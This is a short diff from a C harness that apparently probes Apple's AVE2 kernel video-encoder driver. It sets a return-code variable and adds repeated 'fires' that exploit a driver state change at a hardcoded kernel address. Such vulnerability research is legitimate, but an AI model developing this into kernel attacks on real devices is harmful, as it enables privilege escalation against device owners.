@@ -1138,7 +1138,7 @@ int main(void) {
                 *(uint32_t *)(d5 + 0x0c) = hdr[casei][3];
             }
             uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-            kern_return_t k5;
+            kern_return_t k5 = 0x20000000;
             /* w65-AP multi-fire: fire1 enqueues ProcessCmd (0x1a7c46c) and fails;
                WorkThread runs ProcessCmd -> state=2; later fires ride the new state. */
             { int nfires = getenv("AVE2_H5FIRE") ? atoi(getenv("AVE2_H5FIRE")) : 1;
